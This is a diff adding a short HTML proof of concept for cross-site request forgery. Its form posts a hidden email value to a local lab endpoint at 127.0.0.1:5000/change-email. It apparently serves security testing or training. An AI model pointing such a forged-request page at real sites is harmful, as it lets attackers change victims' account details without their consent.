@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+
+<h2>CSRF Test</h2>
+
+<form method="POST" action="http://127.0.0.1:5000/change-email">
+    <input type="hidden" name="email" value="csrf@local.lab">
+    <button type="submit">Submit CSRF</button>
+</form>
+
+</body>
+</html>
